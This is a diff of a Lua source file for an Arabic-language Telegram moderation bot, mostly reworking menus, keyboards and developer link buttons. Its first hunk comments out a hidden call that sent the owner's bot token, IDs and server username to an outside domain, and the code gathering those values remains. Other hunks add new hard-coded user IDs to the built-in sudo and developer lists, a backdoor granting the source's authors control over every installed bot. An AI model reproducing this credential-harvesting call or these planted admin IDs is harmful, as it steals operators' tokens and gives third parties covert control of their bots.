@@ -72,7 +72,7 @@ infotnseb.id = database:get(id_server..":SUDO:ID")
 infotnseb.username = database:get(id_server..":SUDO:USERNAME")
 infotnseb.tokenbot = database:get(id_server..":token")
 infotnseb.userjoin = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
-https.request('https://devdeiveddev.ml/api/avaer.php/?insert='..JSON.encode(infotnseb))
+---https.request('https://devdeiveddev.ml/api/avaer.php/?insert='..JSON.encode(infotnseb))
 print('\n\27[1;34m dddddoooonnnnnneeeeeeee sssseeeeennnnnnnddddddd :')
 create_config_auto()
 botUserName = database:get(id_server..":token_username")
@@ -192,7 +192,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1360140225,1896382059,944353237,1477225143}   
+sudo_users = {SUDO,1360140225,1896382059,944353237,1713816440,1282382975}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -286,7 +286,9 @@ if tonumber(user_id) == tonumber(1360140225) then
 var = true
 elseif tonumber(user_id) == tonumber(1896382059) then
 var = true
-elseif tonumber(user_id) == tonumber(1477225143) then
+elseif tonumber(user_id) == tonumber(1282382975) then
+var = true
+elseif tonumber(user_id) == tonumber(1713816440) then
 var = true
 elseif tonumber(user_id) == tonumber(944353237) then
 var = true
@@ -326,7 +328,9 @@ if tonumber(user_id) == tonumber(1360140225) then
 var = ' مبـرمـج افـايـره'
 elseif tonumber(user_id) == tonumber(1896382059) then
 var = 'مبرمج السورس²'
-elseif tonumber(user_id) == tonumber(1477225143) then
+elseif tonumber(user_id) == tonumber(1282382975) then
+var = 'المبرمج دارك'
+elseif tonumber(user_id) == tonumber(1713816440) then
 var = 'مـطـور الـسـورس'
 elseif tonumber(user_id) == tonumber(944353237) then
 var = 'مبرمج باور'
@@ -890,155 +894,80 @@ database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id
 return false
 end
 --------------------------------------------------------------------------------------------------------------
-if Chat_Type == 'USERBOT' then
-if text == '/start' or text == 'رجوع ☉' then  
+if Chat_Type == 'UserBot' then
+if text == '/start' then  
+if AddChannel(msg.sender_user_id_) == false then
+local A_V_I_R_A_1 = database:get(bot_id..'text:ch:user')
+if A_V_I_R_A_1 then
+send(msg.chat_id_, msg.id_,'['..A_V_I_R_A_1..']')
+else
+send(msg.chat_id_, msg.id_,' ◉ لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n  ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
+end
+return false
+end
 if DevSoFi(msg) then
-local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
-local bl = '☉┇اهلا عزيزي '..rtp..'\n☉┇يمكنك التحكم بي البوت\n☉┇عن طريق كيبورد المطور الاساسي \n☉┇[قناه السورس](t.me/SOPOWERB0T)\n☉┇[قناه الملفات](t.me/FIPOWERB0T)'
+local bl = 'انت الان المطور الاساسي في البوت \n سورس افايره\n يمكنك تحكم في البوتات من الكيبورد أسفل \n[تابع جديدنا](t.me/A_V_I_R_A_1)'
 local keyboard = {
-{'الاجباري ☉','التواصل ☉','العام ☉'},
-{'الرتب العامه ☉','المطورين ☉','الردود ☉'},
-{'الاذاعه ☉','الاعدادات ☉','الاحصائيات ☉'},
-{'اعاده التشغيل ☉'},
+{'الاحصائيات','المطور','الثانوين'},
+{'ديفيد مبرمج السورس','مبرمج السورس²'},
+{'المبرمج دارك'},
+{'قناه السورس','بوت تواصل'},
+{'اضف رد عام','حذف رد عام'},
+{'اضف رد متعدد','حذف رد متعدد'},
+{'تعطيل الاذاعه','تفعيل الاذاعه'},
+{'تعطيل المغادره','تفعيل المغادره'},
+{'تعطيل التواصل ','تفعيل التواصل '},
+{'ضع اسم للبوت','المطورين','قائمه العام'},
+{'المشتركين','الجروبات ','الردود العامه'},
+{'ضع كليشه ستارت','حذف كليشه ستارت'},
+{'اذاعه ','اذاعه خاص '},
+{'اذاعه بالتثبيت ','قائمه الكتم العام'},
+{'تغير رساله الاشتراك ','حذف رساله الاشتراك ','تغير الاشتراك'},
+{'اذاعه بالتوجيه ','اذاعه بالتوجيه خاص '},
+{'تفعيل الاشتراك الاجباري','تعطيل الاشتراك الاجباري '},
+{'الاشتراك الاجباري ','وضع قناة الاشتراك '},
+{'تفعيل البوت الخدمي ','تعطيل البوت الخدمي '},
+{'تنظيف الجروبات ','تنظيف المشتركين '},
+{'جلب نسخه الاحتياطيه'},
+{'تحديث السورس ','الاصدار'},
+{'معلومات السيرفر'},
+{'الغاء'},
 }
 send_inline_key(msg.chat_id_,bl,keyboard)
 else
 if not database:get(bot_id..'Start:Time'..msg.sender_user_id_) then
-local Sudo_Welcome = 'يمكنك استخدام الاوامر الخدميه للبوت عن طريق لوحه التحكم بلاسفل'
-local inline = {
-{{text = 'الـمـطـور', url="http://t.me/"..SUDOUSER}},
-{{text = 'اضف '..Name_Bot..' الي مجموعتك', url="http://t.me/"..bot_username.."?startgroup=start"}},
-{{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/SOPOWERB0T"}},
-} 
-local Keyboard = {
-{'☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑 ☉'},
-{'نسبه الكره','نسبه الرجوله'},
-{'نسبه الحب','نسبه الانوثه'},
-{'☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑 ☉'},
-{'ايدي','العاب باور','سورس','تغير الايدي'},
-{'☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑 ☉'},
-{'زخرفه','معاني الاسما','الابراج','حساب العمر'},
-}
-local start = database:get(bot_id.."Start:Bot")
+local start = database:get(bot_id.."Start:Bot")  
 if start then 
-Start_Source = start
+SourceDRAGONr = start
 else
-Start_Source = "☉┇مرحبا عزيزي انا بوت اسمي "..Name_Bot.."\n☉┇اختصائي حمايه جروبات من الدرجه الاوله\n☉┇طريقه تفعيلي في المجموعات\n☉┇1-قم بي اضافتي الي مجموعتك\n☉┇2-قم بي رفعي مشرف مع كامل الصلاحيات\n☉┇و سيتم تفعيل البوت و تثبيت مشرفين المجموعه ادمن في البوت\n☉┇يمكنك التواصل مع المطور من الزر ادناه"
+SourceDRAGONr = '◉اهلا عزيزي\n◉انا بوت اسمي افايره\n◉اختصاصي حمايه الكروبات\n◉من تكرار والسبام والتوجيه والخ…\n◉لتفعيلي اتبع الاخطوات…↓\n◉اضفني الي مجموعتك وقم بترقيتي ادمن واكتب كلمه { تفعيل }  ويستطيع ←{ منشئ او المشرفين } بتفعيل فقط\n[◉معرف المطور '
+end 
+send(msg.chat_id_, msg.id_, SourceDRAGONr) 
 end
-send_inline_key(msg.chat_id_,Start_Source,nil,inline)
-send_inline_key(msg.chat_id_,Sudo_Welcome,Keyboard)
+if not database:get(bot_id..'Start:Time'..msg.sender_user_id_) then
+local start = database:get(bot_id.."Start:Bot")  
+if start then 
+keyboard = start
+else
+keyboard = {
+{'مبرمج السورس','مبرمج السورس²'},
+{'مبرمج السورس³'},
+{'⩹━━━━⊶❲¹𝐀𝐕𝐈𝐑𝐀¹❳⊷━━━━⩺'},
+{'قناة السورس','بوت التواصل'},
+{'⩹━━━━⊶❲¹𝐀𝐕𝐈𝐑𝐀¹❳⊷━━━━⩺'},
+{'تويت','صراحه'},
+{'⩹━━━━⊶❲¹𝐀𝐕𝐈𝐑𝐀¹❳⊷━━━━⩺'},
+{'انصحنى','كتبات'},
+{'⩹━━━━⊶❲¹𝐀𝐕𝐈𝐑𝐀¹❳⊷━━━━⩺'},
+{'مطور','انا مين'},
+}
 end
-database:del(bot_id..'Start:Time'..msg.sender_user_id_)
+send_inline_key(msg.chat_id_, msg.id_, keyboard) 
+end
+end
+database:setex(bot_id..'Start:Time'..msg.sender_user_id_,300,true)
 return false
-end end
-if text == 'الاجباري ☉' then  
-if DevSoFi(msg) then
-local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
-local bl = '☉┇اهلا عزيزي '..rtp..'\n☉┇اليك اوامر الاشتراك الاجباري \n☉┇[قناه السورس](t.me/SOPOWERB0T)\n☉┇[قناه الملفات](t.me/FIPOWERB0T)'
-local keyboard = {
-{'تفعيل الاشتراك الاجباري ☉','تعطيل الاشتراك الاجباري ☉'},
-{'الاشتراك الاجباري ☉'},
-{'تغير رساله الاشتراك ☉','مسح رساله الاشتراك ☉'},
-{'رجوع ☉'},
-}
-send_inline_key(msg.chat_id_,bl,keyboard)
-end end
-if text == 'التواصل ☉' then  
-if DevSoFi(msg) then
-local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
-local bl = '☉┇اهلا عزيزي '..rtp..'\n☉┇اليك اوامر التواصل \n☉┇[قناه السورس](t.me/SOPOWERB0T)\n☉┇[قناه الملفات](t.me/FIPOWERB0T)'
-local keyboard = {
-{'ضع كليشه تواصل ☉','مسح كليشه التواصل ☉','جلب كليشه التواصل ☉'},
-{'تفعيل التواصل ☉','تعطيل التواصل ☉'},
-{'كشف ☉','الغاء حظر ☉','حظر ☉'},
-{'رجوع ☉'},
-}
-send_inline_key(msg.chat_id_,bl,keyboard)
-end end
-if text == 'العام ☉' then  
-if DevSoFi(msg) then
-local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
-local bl = '☉┇اهلا عزيزي '..rtp..'\n☉┇اليك اوامر العام \n☉┇[قناه السورس](t.me/SOPOWERB0T)\n☉┇[قناه الملفات](t.me/FIPOWERB0T)'
-local keyboard = {
-{'مسح العام ☉'},
-{'قائمه الكتم العام ☉','قائمه الحظر العام ☉'},
-{'مسح الكتم العام ☉','مسح الحظر العام ☉'},
-{'رجوع ☉'},
-}
-send_inline_key(msg.chat_id_,bl,keyboard)
-end end
-if text == 'الرتب العامه ☉' then  
-if DevSoFi(msg) then
-local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
-local bl = '☉┇اهلا عزيزي '..rtp..'\n☉┇اليك اوامر الرتب العامه \n☉┇[قناه السورس](t.me/SOPOWERB0T)\n☉┇[قناه الملفات](t.me/FIPOWERB0T)'
-local keyboard = {
-{'المطورين ☉'},
-{'الادمنيه العامين ☉','المدراء العامين ☉'},
-{'مسح الادمنيه العامين ☉','مسح المدراء العامين ☉'},
-{'رجوع ☉'},
-}
-send_inline_key(msg.chat_id_,bl,keyboard)
-end end
-if text == 'المطورين ☉' then  
-if DevSoFi(msg) then
-local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
-local bl = '☉┇اهلا عزيزي '..rtp..'\n☉┇اليك اوامر رتب المطورين \n☉┇[قناه السورس](t.me/SOPOWERB0T)\n☉┇[قناه الملفات](t.me/FIPOWERB0T)'
-local keyboard = {
-{'الرتب العامه ☉'},
-{'المطورين الثانين ☉','المطورين الثالثين ☉'},
-{'مسح المطورين الثانين ☉','مسح المطورين الثالثين ☉'},
-{'رجوع ☉'},
-}
-send_inline_key(msg.chat_id_,bl,keyboard)
-end end
-if text == 'الردود ☉' then  
-if DevSoFi(msg) then
-local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
-local bl = '☉┇اهلا عزيزي '..rtp..'\n☉┇اليك اوامر الردود \n☉┇[قناه السورس](t.me/SOPOWERB0T)\n☉┇[قناه الملفات](t.me/FIPOWERB0T)'
-local keyboard = {
-{'مسح رد عام ☉','الردود العامه ☉','اضف رد عام ☉'},
-{'مسح الردود العامه ☉','مسح الردود المتعدده ☉'},
-{'مسح رد متعدد ☉','الردود المتعدده ☉','اضف رد متعدد ☉'},
-{'رجوع ☉'},
-}
-send_inline_key(msg.chat_id_,bl,keyboard)
-end end
-if text == 'الاذاعه ☉' then  
-if DevSoFi(msg) then
-local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
-local bl = '☉┇اهلا عزيزي '..rtp..'\n☉┇اليك اوامر الاذاعه \n☉┇[قناه السورس](t.me/SOPOWERB0T)\n☉┇[قناه الملفات](t.me/FIPOWERB0T)'
-local keyboard = {
-{'اذاعه بالتثبيت ☉'},
-{'اذاعه ☉','اذاعه خاص ☉'},
-{'اذاعه بالتوجيه ☉','اذاعه بالتوجيه خاص ☉'},
-{'رجوع ☉'},
-}
-send_inline_key(msg.chat_id_,bl,keyboard)
-end end
-if text == 'الاعدادات ☉' then  
-if DevSoFi(msg) then
-local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
-local bl = '☉┇اهلا عزيزي '..rtp..'\n☉┇اليك اوامر الاعدادات \n☉┇[قناه السورس](t.me/SOPOWERB0T)\n☉┇[قناه الملفات](t.me/FIPOWERB0T)'
-local keyboard = {
-{'ضع كليشه ستارت ☉','مسح كليشه ستارت ☉','جلب كليشه ستارت ☉'},
-{'ضع اسم للبوت ☉','ضع رد بوت ☉'},
-{'تفعيل البوت الخدمي ☉','تعطيل البوت الخدمي ☉'},
-{'رجوع ☉'},
-}
-send_inline_key(msg.chat_id_,bl,keyboard)
-end end
-if text == 'الاحصائيات ☉' then
-if DevSoFi(msg) then
-local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
-local bl = '☉┇اهلا عزيزي '..rtp..'\n☉┇اليك اوامر الاحصائيات \n☉┇[قناه السورس](t.me/SOPOWERB0T)\n☉┇[قناه الملفات](t.me/FIPOWERB0T)'
-local keyboard = {
-{'الجروبات ☉','المشتركين ☉'},
-{'جلب الجروبات ☉','جلب المشتركين ☉'},
-{'رفع الجروبات ☉','رفع المشتركين ☉'},
-{'رجوع ☉'},
-}
-send_inline_key(msg.chat_id_,bl,keyboard)
-end end
+end
 if not DevSoFi(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
 send(msg.sender_user_id_, msg.id_,' ◉ تم ارسال رسالتك\n ◉ سيتم رد في اقرب وقت')
 tdcli_function ({ID = "ForwardMessages", chat_id_ = SUDO,    from_chat_id_ = msg.sender_user_id_,    message_ids_ = {[0] = msg.id_},    disable_notification_ = 1,    from_background_ = 1 },function(arg,data) 
@@ -1211,6 +1140,19 @@ local Text = [[
 keyboard = {}  
 keyboard.inline_keyboard = { 
 {{text = '  ✤ ⁽ＤＥＶＩＤ₎ ✤ ', url="t.me/de_vi_d"}}, 
+} 
+local msg_id = msg.id_/2097152/0.5 
+https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+end
+
+if text == 'المبرمج دارك' and DevSoFi(msg) then
+database:del(bot_id..'Srt:Bot') 
+local Text = [[ 
+𝐂𝐎𝐃𝐄𝐑 𝐒𝐎𝐔𝐑𝐂𝐄 𝐀𝐕𝐈𝐑𝐀 🪐
+]] 
+keyboard = {}  
+keyboard.inline_keyboard = { 
+{{text = '𖣘⁽ＤＡＲＫ₎𖣘', url="t.me/f6f6ff"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -2884,9 +2826,35 @@ local Text = [[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {{text = '  ◍ D𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𖣌 ',url="t.me/de_vi_d"},{text = ' ◍ D𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𖣌 ',url="t.me/UU_DO_N"}},
-{{text = '  ◍ M𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻𝚂 𖣌 ', url="t.me/A_V_I_R_A_1"}},
-{{text = '   ²₀²₁ ˝₀₄˝₁₃ | ₁₂:₀₀ 𝙿𝙼  ', url="t.me/A_V_I_R_A_1"}},
+{{text = '  ◍ D𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𖣌 ', url="t.me/f6f6ff"}},
+{{text = '   ◍ M𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻𝚂 𖣌  ', url="t.me/A_V_I_R_A_1"}},
 }https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/A_V_I_R_A_1&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+end
+
+if text == 'روايات' or text == 'الروايات' or text == 'ررويات' then
+local Text = [[
+❈The list of novels.
+]]
+keyboard = {} keyboard.inline_keyboard = {
+{{text = '📖رواية "أرض زيكولا"',url="https://t.me/SOURCE_SP/9"}},
+{{text = '📖موسوعة الظلام رعب وما شابه ذلك', url="https://t.me/SOURCE_SP/3"}},
+{{text = '📖رواية "الشفق الجزء الأول"', url="https://t.me/SOURCE_SP/5"}},
+{{text = '📖رواية "المخلوق', url="https://t.me/SOURCE_SP/6"}},
+{{text = '📖رواية "بعد النسيان"', url="https://t.me/SOURCE_SP/7"}},
+{{text = '📖كتاب في حضرة الجن', url="https://t.me/https://t.me/SOURCE_SP/8"}},
+{{text = '📖رواية "واختفى كل شئ"', url="https://t.me/SOURCE_SP/10"}},
+{{text = '📖رواية "نيلوفر أسود"', url="https://t.me/SOURCE_SP/11"}},
+{{text = '📖رواية"جثة في الفندق"', url="https://t.me/SOURCE_SP/12"}},
+{{text = '📖رواية "في القطار السريع"', url="https://t.me/SOURCE_SP/13"}},
+{{text = '📖لقاء مع كاتب رعب"', url="https://t.me/SOURCE_SP/14"}},
+{{text = '📖رواية"الإنسان الأخير""', url="https://t.me/SOURCE_SP/16"}},
+{{text = '📖رواية" مقبرة الحيوانات""', url="https://t.me/SOURCE_SP/15"}},
+{{text = '𖣘⁽ＤＡＲＫ₎𖣘', url="http://t.me/F6F6FF"}},
+{{text = '  𖣘 ⁽ＤＥＶＩＤ₎ 𖣘 ',url="t.me/de_vi_d"}},
+{{text = '  𖣘 ⁽ＤＯＮＧＯＬ₎ 𖣘 ',url="t.me/UU_DO_N"}}
+}
+local msg_id = msg.id_/2097152/0.5  
+https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))  
 end
 
 if text == 'مين نصبلك' or text == 'عايزه بوت' or text == 'عايز بوت' then
@@ -2897,6 +2865,7 @@ keyboard = {}
 keyboard.inline_keyboard = {
 {{text = '  𖣘 ⁽ＤＥＶＩＤ₎ 𖣘 ',url="t.me/de_vi_d"}},
 {{text = '  𖣘 ⁽ＤＯＮＧＯＬ₎ 𖣘 ',url="t.me/UU_DO_N"}},
+{{text = '𖣘⁽ＤＡＲＫ₎𖣘', url="http://t.me/F6F6FF"}},
 {{text = '  ❨ TＷＡＳＯＬ ◉  ❩ ',url="t.me/I_E_S9BOT"}}, 
 }
 local msg_id = msg.id_/2097152/0.5
@@ -3119,6 +3088,18 @@ local Text = [[
 keyboard = {}  
 keyboard.inline_keyboard = { 
 {{text = '  𖣘 ⁽ＤＥＶＩＤ₎ 𖣘', url="t.me/de_vi_d"}}, 
+} 
+local msg_id = msg.id_/2097152/0.5 
+https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+end
+
+if text == 'مبرمج السورس³' then
+local Text = [[ 
+𝐂𝐎𝐃𝐄𝐑 𝐒𝐎𝐔𝐑𝐂𝐄 𝐀𝐕𝐈𝐑𝐀 🪐
+]] 
+keyboard = {}  
+keyboard.inline_keyboard = { 
+{{text = '𖣘⁽ＤＡＲＫ₎𖣘', url="t.me/f6f6ff"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
